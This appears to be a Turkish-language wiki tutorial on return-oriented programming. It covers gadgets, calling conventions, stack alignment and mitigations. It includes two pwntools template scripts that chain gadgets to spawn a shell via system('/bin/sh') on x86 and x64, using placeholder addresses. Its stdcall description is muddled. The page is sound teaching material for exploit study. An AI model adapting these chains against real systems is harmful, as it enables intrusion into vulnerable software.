# **Temel Bilgiler**

**Return-Oriented Programming (ROP)**, **No-Execute (NX)** veya **Data Execution Prevention (DEP)** gibi güvenlik önlemlerini atlatmak için kullanılan gelişmiş bir sömürü tekniğidir. Bir saldırgan, kabuk kodu enjekte etmek ve yürütmek yerine, genellikle ikili dosyada veya yüklenmiş kütüphanelerde bulunan, **"gadget"** olarak bilinen kod parçalarını kullanır. Her gadget genellikle bir `ret` talimatı ile biter ve veri kaydırmak veya aritmetik işlemler gibi küçük bir işlem gerçekleştirir. Bu gadget'ları bir araya getirerek, bir saldırgan, NX/DEP korumalarını atlayarak keyfi işlemler gerçekleştirmek için bir yük oluşturabilir.

### ROP Nasıl Çalışır

1. **Kontrol Akışı Kaçırma**: İlk olarak, bir saldırganın bir programın kontrol akışını ele geçirmesi gerekir, genellikle bir tam buffer taşması kullanarak yığında kaydedilen bir dönüş adresini üzerine yazarak.
2. **Gadget Zinciri**: Saldırgan daha sonra istenen işlemleri gerçekleştirmek için dikkatlice gadget'ları seçer ve birbirine bağlar. Bu, bir işlev çağrısı için argümanları ayarlamayı, işlevi çağırmayı (örneğin, `system("/bin/sh")`), ve gerekli temizlik veya ek işlemleri ele almayı içerebilir.
3. **Yük Yürütme**: Kırılgan işlev döndüğünde, meşru bir konuma dönmemek yerine, gadget zincirini yürütmeye başlar.

### Araçlar

Genellikle, gadget'lar [**ROPgadget**](https://github.com/JonathanSalwan/ROPgadget), ve [**ropper**](https://github.com/sashs/Ropper) veya doğrudan **pwntools** ([ROP](https://docs.pwntools.com/en/stable/rop/rop.html)) kullanılarak bulunabilir.

## x 32-bit Örneğinde ROP Zinciri

### **x86 (32-bit) Çağrı Kuralları**

* **cdecl**: Çağrı yapan yığını temizler. İşlev argümanları ters sırayla (sağdan sola) yığına itilir. **Argümanlar sağdan sola doğru yığına itilir.**
* **stdcall**: Cdecl'ye benzer, ancak yığını temizleme işlemi çağrıyı yapan işlevin sorumluluğundadır.

### **Gadget'lar Bulma**

İlk olarak, ikili dosya veya yüklenmiş kütüphaneler içinde gerekli gadget'ları tanımladığımızı varsayalım. İlgilendiğimiz gadget'lar şunlardır:

* `pop eax; ret`: Bu gadget, yığının en üst değerini `EAX` kaydedicisine iter ve ardından döner, böylece `EAX` üzerinde kontrol sağlar.
* `pop ebx; ret`: Yukarıdakiyle benzer, ancak `EBX` kaydedicisi için, `EBX` üzerinde kontrol sağlar.
* `mov [ebx], eax; ret`: `EAX` içindeki değeri `EBX` tarafından işaret edilen bellek konumuna taşır ve ardından döner. Bu genellikle bir **write-what-where gadget** olarak adlandırılır.
* Ayrıca, `system()` işlevinin adresine sahibiz.

### **ROP Zinciri**

**pwntools** kullanarak, ROP zinciri yürütmesi için yığına hazırlık yaparız ve aşağıdaki gibi devam ederiz, `system('/bin/sh')`'yi yürütmeyi amaçlayarak, zincirin aşağıdaki ile başladığına dikkat edin:

1. Hizalama amaçlı bir `ret` talimatı (isteğe bağlı)
2. `system` işlevinin adresi (ASLR devre dışı bırakılmış ve bilinen libc varsayılarak, daha fazla bilgi için [**Ret2lib**](ret2lib/))
3. `system()`'dan dönen adres için yer tutucu
4. `"/bin/sh"` dizesi adresi (system işlevi için parametre)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadc0de

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## x64 Örneğinde ROP Zinciri

### **x64 (64-bit) Çağrı Kuralları**

* Unix benzeri sistemlerde **System V AMD64 ABI** çağrı kuralını kullanır, burada **ilk altı tamsayı veya işaretçi argüman `RDI`, `RSI`, `RDX`, `RCX`, `R8` ve `R9`** registerlara iletilir. Ek argümanlar yığına iletilir. Dönüş değeri `RAX` registerına yerleştirilir.
* **Windows x64** çağrı kuralı ilk dört tamsayı veya işaretçi argümanlar için `RCX`, `RDX`, `R8` ve `R9` kullanır, ek argümanlar yığına iletilir. Dönüş değeri `RAX` registerına yerleştirilir.
* **Registerlar**: 64-bit registerlar arasında `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP` ve `R8` ile `R15` bulunur.

#### **Gadget'ları Bulma**

Amacımız, **RDI** registerını ayarlamamıza ( **system()** fonksiyonuna **"/bin/sh"** dizesini argüman olarak iletmek için) ve ardından **system()** fonksiyonunu çağırmamıza izin verecek gadget'lara odaklanmak. Aşağıdaki gadget'ları tanımladığımızı varsayalım:

* **pop rdi; ret**: Yığının en üst değerini **RDI**'ya çıkarır ve ardından döner. **system()** için argümanımızı ayarlamak için temel öneme sahiptir.
* **ret**: Basit bir dönüş, bazı senaryolarda yığın hizalaması için kullanışlıdır.

Ve **system()** fonksiyonunun adresini biliyoruz.

### **ROP Zinciri**

Aşağıda, **x64** üzerinde **system('/bin/sh')**'ı çalıştırmayı amaçlayan bir ROP zinciri oluşturup çalıştırmak için **pwntools** kullanarak bir örnek bulunmaktadır:
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
### Yığın Hizalaması

**x86-64 ABI**, bir **çağrı talimatı** yürütüldüğünde **yığının 16 bayt hizalandığını** sağlar. **LIBC**, performansı optimize etmek için **SSE talimatları** (örneğin **movaps**) kullanır ve bu hizalamayı gerektirir. Eğer yığın düzgün hizalanmamışsa (yani **RSP** 16'nın katı değilse), **system** gibi fonksiyonlara yapılan çağrılar bir **ROP zincirinde** başarısız olacaktır. Bunun düzeltilmesi için ROP zincirinizde **system**'i çağırmadan önce basitçe bir **ret gadget** ekleyin.

## x86'ya karşı x64 ana fark

{% hint style="success" %}
**x64, ilk birkaç argüman için kayıtları kullandığından**, basit fonksiyon çağrıları için genellikle x86'dan daha az gadget gerektirir, ancak doğru gadget'ları bulup zincirlemek, artan kayıt sayısı ve daha büyük adres alanı nedeniyle daha karmaşık olabilir. **x64** mimarisinde artan kayıt sayısı ve daha büyük adres alanı, özellikle Return-Oriented Programming (ROP) bağlamında, hem fırsatlar hem de zorluklar sunar.
{% endhint %}

## ARM64 Örneğinde ROP Zinciri

### **ARM64 Temelleri ve Çağrı Kuralları**

Bu bilgiler için aşağıdaki sayfaya bakın:

{% content-ref url="../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

## ROP'a Karşı Korumalar

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) **ve** [**PIE**](../common-binary-protections-and-bypasses/pie/): Bu korumalar, adreslerin yürütme arasında değişmesi nedeniyle ROP'un kullanımını zorlaştırır.
* [**Yığın Kanaryaları**](../common-binary-protections-and-bypasses/stack-canaries/): BOF durumunda, ROP zincirini kötüye kullanmak için geri dönüş işaretçilerini üzerine yazmak için yığın kanaryasını atlamak gereklidir.
* **Gadget Eksikliği**: Yeterli sayıda gadget yoksa ROP zinciri oluşturulamaz.

## ROP tabanlı teknikler

ROP'un sadece keyfi kodu yürütmek için bir teknik olduğunu unutmayın. ROP'a dayalı birçok Ret2XXX tekniği geliştirilmiştir:

* **Ret2lib**: Yüklenmiş bir kütüphaneden keyfi parametrelerle keyfi işlevleri çağırmak için ROP'u kullanın (genellikle `system('/bin/sh')` gibi bir şey).
  
{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: Bir sistem çağrısına, örneğin `execve`, hazırlamak için ROP'u kullanın ve keyfi komutları yürütün.

{% content-ref url="rop-syscall-execv/" %}
[rop-syscall-execv](rop-syscall-execv/)
{% endcontent-ref %}

* **EBP2Ret ve EBP Zincirleme**: İlk olarak akışı kontrol etmek için EBP'yi EIP yerine kötüye kullanacak ve ikincisi Ret2lib'e benzer ancak akışı çoğunlukla EBP adresleriyle kontrol eder (ancak EIP'yi kontrol etmek de gereklidir).

{% content-ref url="../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md" %}
[stack-pivoting-ebp2ret-ebp-chaining.md](../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md)
{% endcontent-ref %}

## Diğer Örnekler ve Referanslar

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)
* [https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html)
* 64 bit, Pie ve nx etkin, kanarya yok, RIP'yi yalnızca bir `vsyscall` adresiyle üzerine yazarak, sızdıran bayrağı elde etmek için işlevin bir kısmını almak için yığında bir sonraki adrese dönüş yapacak bir kısmi üzerine yazma
* [https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/](https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/)
* arm64, ASLR yok, ROP gadget'ı yığını yürütülebilir yapmak ve yığında shellcode'a atlamak için
